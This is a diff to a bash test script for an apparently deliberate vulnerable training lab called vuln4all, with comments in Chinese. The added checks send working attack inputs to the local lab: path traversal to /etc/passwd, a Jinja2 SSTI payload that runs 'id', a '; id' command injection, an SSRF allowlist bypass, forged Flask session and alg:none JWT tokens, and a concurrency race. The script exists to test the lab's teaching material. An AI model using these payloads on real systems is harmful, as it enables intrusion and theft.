@@ -32,6 +32,22 @@ expect_has()  { if has "$2" "$3"; then ok "$1"; else bad "$1（返回体里找�
 expect_no()   { if has "$2" "$3"; then bad "$1（不该出现 [$2]，却出现了）"; else ok "$1"; fi; }
 expect_code() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1（期望 HTTP $3，实际 $2）"; fi; }
 
+# 题目页里自带「提示 / 答案」折叠区，里面有解题文本。做内容断言之前必须把它剥掉 ——
+# 否则随便挑一个字符串都能在答案里找到，测试就会变成「永远通过」的假阳性。
+# 这个坑真的踩过一次：`uid=` 在答案里就有，于是失败的反倒"通过"了。
+strip_teaching() {
+  python3 -c '
+import re, sys
+html = sys.stdin.read()
+# 只剥 core 外壳里的教学折叠区。约定：模块自己的模板不要用 <details>
+# 承载测试要断言的内容 —— 否则会被一起剥掉。
+print(re.sub(r"<details\b.*?</details>", "", html, flags=re.S))
+'
+}
+
+# 抓一个页面，并且把教学文本剥掉
+page() { curl -s "$@" | strip_teaching; }
+
 cleanup() {
   if [ -f "$PIDFILE" ]; then
     pid=$(cat "$PIDFILE")
@@ -127,6 +143,8 @@ body=$(curl -s "$BASE/")
 expect_has "清单页有搜索框"          'id="v4a-search"' "$body"
 expect_has "清单页有分类筛选按钮"    'class="chip' "$body"
 expect_has "清单页有分类区块"        'class="cat"' "$body"
+expect_has "清单页有难度筛选"        'id="v4a-diffs"' "$body"
+expect_has "难度标签上了色"          'badge-diff-easy' "$body"
 expect_has "页脚标了作者"            "guaidao2" "$body"
 
 body=$(curl -s "$BASE/v/sqli/login_bypass/")
@@ -529,6 +547,207 @@ fi
 
 cd "$ROOT" || exit 1
 rm -rf "$LAB"
+
+step "10. 第二批模块（不同难度 / 不同业务场景）"
+
+# ---- path_traversal/file_download —— 企业网盘
+body=$(curl -s --get "$BASE/v/path_traversal/file_download/download" \
+  --data-urlencode "name=../内部资料/薪资表.csv")
+expect_has "路径穿越读到共享目录外的文件" "vuln4all{path_traversal_ok}" "$body"
+
+body=$(curl -s --get "$BASE/v/path_traversal/file_download/download" \
+  --data-urlencode "name=/etc/passwd")
+expect_has "绝对路径顶掉基准目录（os.path.join 的坑）" "root:" "$body"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' --get \
+  "$BASE/v/path_traversal/file_download/download" \
+  --data-urlencode "name=/nonexistent-nope")
+expect_code "不存在的文件返回 404" "$code" "404"
+
+# ---- ssti/jinja2_profile —— 团队协作 SaaS
+body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" --data-urlencode "template={{7*7}}")
+expect_has "模板被求值（7*7 -> 49）" "49" "$body"
+expect_has "里程碑记录下来了"        "模板被求值" "$body"
+
+body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" --data-urlencode "template={{config}}")
+expect_has "config 被渲染出来" "SECRET_KEY" "$body"
+
+body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" \
+  --data-urlencode "template={{ cycler.__init__.__globals__.os.popen('id').read() }}")
+expect_has "SSTI 拿到命令执行" "uid=" "$body"
+
+# ---- command_injection/ping_tool —— 运维诊断
+body=$(page -X POST "$BASE/v/command_injection/ping_tool/" \
+  --data-urlencode "host=127.0.0.1; id")
+expect_has "命令注入拿到 uid=" "uid=" "$body"
+expect_has "页面判定通关"      "这题通了" "$body"
+
+body=$(page -X POST "$BASE/v/command_injection/ping_tool/" \
+  --data-urlencode "host=127.0.0.1")
+expect_no "正常输入不该出现 uid=" "uid=" "$body"
+
+# ---- ssrf/url_preview —— 聊天链接预览（双挂载点）
+IMPLANT="http://img.vuln4all.local@127.0.0.1:${PORT}/internal-admin/"
+body=$(page -X POST "$BASE/v/ssrf/url_preview/" --data-urlencode "url=$IMPLANT")
+expect_has "SSRF 打到内网管理后台" "内部管理后台" "$body"
+expect_has "SSRF 判定通关"        "这题通了" "$body"
+
+body=$(page -X POST "$BASE/v/ssrf/url_preview/" \
+  --data-urlencode "url=http://example.com/x.png")
+expect_has "白名单确实在拦（不含标记的域名被拒）" "只允许抓取" "$body"
+
+# 过了白名单、但目标不是内网后台 —— 应该抓不到那个标记。
+# 这一条是用来证明上面那个 PASS 是"真抓到了"，而不是断言写松了。
+body=$(page -X POST "$BASE/v/ssrf/url_preview/" \
+  --data-urlencode "url=http://img.vuln4all.local@127.0.0.1:${PORT}/nope")
+expect_no "过了白名单但目标不对，抓不到内网内容" "内部管理后台" "$body"
+
+body=$(curl -s "$BASE/")
+expect_no "内网后台的路径不出现在清单页上" "/internal-admin" "$body"
+expect_has "清单页只提示有这么个隐藏入口" "隐藏入口" "$body"
+
+# ---- flask_session/forged_cookie —— 订阅后台提权
+COOKIE=$(
+  python3 - <<'PY'
+from flask import Flask
+from flask.sessions import SecureCookieSessionInterface
+
+app = Flask(__name__)
+app.secret_key = "vuln4all-demo-secret"
+serializer = SecureCookieSessionInterface().get_signing_serializer(app)
+print(serializer.dumps({"user": "mallory", "plan": "enterprise", "admin": True}))
+PY
+)
+if [ -n "$COOKIE" ]; then
+  ok "用弱密钥签出了一个 session cookie"
+else
+  bad "签 cookie 失败"
+fi
+
+code=$(curl -s -o /tmp/v4a-forged.html -w '%{http_code}' \
+  -b "v4a_flask_session_forged_cookie_main=$COOKIE" \
+  "$BASE/v/flask_session/forged_cookie/admin")
+expect_code "伪造 cookie 进管理员页（200）" "$code" "200"
+expect_has "管理员页判定通关" "这题通了" "$(strip_teaching < /tmp/v4a-forged.html)"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' \
+  "$BASE/v/flask_session/forged_cookie/admin")
+expect_code "不带 cookie 进不去（403）" "$code" "403"
+
+# ---- race_condition/coupon_redeem —— 限时优惠券并发
+body=$(page "$BASE/v/race_condition/coupon_redeem/")
+expect_no "并发之前没通关" "这题通了" "$body"
+
+seq 24 | xargs -P24 -I{} curl -s -o /dev/null -X POST \
+  "$BASE/v/race_condition/coupon_redeem/redeem"
+body=$(page "$BASE/v/race_condition/coupon_redeem/")
+expect_has "并发把「每人一次」打破了" "这题通了" "$body"
+
+# ---- jwt/alg_none —— 开放 API 平台
+TOKEN=$(
+  python3 - <<'PY'
+import base64, json
+
+def b64e(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+head = b64e(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+body = b64e(json.dumps({"user": "mallory", "role": "admin"}).encode())
+print(head + "." + body + ".")
+PY
+)
+code=$(curl -s -o /tmp/v4a-jwt.html -w '%{http_code}' \
+  -H "Authorization: Bearer $TOKEN" "$BASE/v/jwt/alg_none/api/admin/keys")
+expect_code "alg:none 的 token 通过了鉴权（200）" "$code" "200"
+expect_has "管理员接口判定通关" "这题通了" "$(strip_teaching < /tmp/v4a-jwt.html)"
+
+code=$(curl -s -o /dev/null -w '%{http_code}' \
+  "$BASE/v/jwt/alg_none/api/admin/keys")
+expect_code "不带 token 进不去（401）" "$code" "401"
+
+rm -f /tmp/v4a-forged.html /tmp/v4a-jwt.html
+
+step "11. 运行配置（局域网 / 配置文件）"
+
+out=$(python3 - <<'PY'
+import sys
+sys.path.insert(0, ".")
+from pathlib import Path
+from vuln4all import config
+
+s, notes = config.resolve(Path("."), {"port": 70000})
+print("越界端口 ->", s["port"], "有提示" if notes else "没提示")
+
+print("回环识别 ->", [config.is_loopback(x) for x in
+      ("127.0.0.1", "localhost.", "[::1]", "::ffff:127.0.0.1", "0.0.0.0")])
+
+print("通配识别 ->", [config.is_wildcard(x) for x in ("0.0.0.0", "::", "127.0.0.1")])
+PY
+)
+expect_has "越界端口退回默认值并给出提示" "越界端口 -> 8800 有提示" "$out"
+expect_has "回环识别覆盖尾点/方括号/IPv4映射" "回环识别 -> [True, True, True, True, False]" "$out"
+expect_has "通配地址识别" "通配识别 -> [True, True, False]" "$out"
+
+# 配置文件里出现百分号，不能把整个文件丢掉（configparser 默认的 %-插值会）
+cat >vuln4all.ini <<'CFG'
+[vuln4all]
+host = 0.0.0.0
+port = 88%20
+allow_remote = true
+CFG
+out=$(python3 - <<'PY'
+import sys
+sys.path.insert(0, ".")
+from pathlib import Path
+from vuln4all import config
+
+s, notes = config.resolve(Path("."), {})
+print("host ->", s["host"])
+print("port ->", s["port"])
+print("文件被丢掉了" if any("读 vuln4all.ini 失败" in n for n in notes) else "文件还在")
+PY
+)
+expect_has "配置里的 % 不会连累其他键" "host -> 0.0.0.0" "$out"
+expect_has "坏的 port 单独退回默认值" "port -> 8800" "$out"
+expect_has "整个配置文件没有被丢掉" "文件还在" "$out"
+rm -f vuln4all.ini
+
+# --lan 不该把用户显式指定的 --host 悄悄放大
+out=$(python3 - <<'PY'
+import argparse, sys
+sys.path.insert(0, ".")
+from vuln4all.cli import build_parser
+
+parser = build_parser()
+for argv in (["run", "--lan"], ["run", "--lan", "--host", "192.168.1.5"]):
+    args = parser.parse_args(argv)
+    overrides = {k: getattr(args, k) for k in ("host", "port", "reload") if hasattr(args, k)}
+    if args.lan and "host" not in overrides:
+        overrides["host"] = "0.0.0.0"
+    print(argv, "->", overrides.get("host"))
+PY
+)
+expect_has "只给 --lan 时绑所有网卡" "['run', '--lan'] -> 0.0.0.0" "$out"
+expect_has "同时给了 --host 时听 --host 的" "--host', '192.168.1.5'] -> 192.168.1.5" "$out"
+
+# --no-reload 能关掉配置文件里的 reload
+cat >vuln4all.ini <<'CFG'
+[vuln4all]
+reload = true
+CFG
+out=$(python3 - <<'PY'
+import sys
+sys.path.insert(0, ".")
+from pathlib import Path
+from vuln4all import config
+
+print("只读 ini ->", config.resolve(Path("."), {})[0]["reload"])
+print("--no-reload ->", config.resolve(Path("."), {"reload": False})[0]["reload"])
+PY
+)
+expect_has "配置文件里的 reload 能生效" "只读 ini -> True" "$out"
+expect_has "--no-reload 能盖掉它" "--no-reload -> False" "$out"
+rm -f vuln4all.ini
 
 step "结果"
 printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
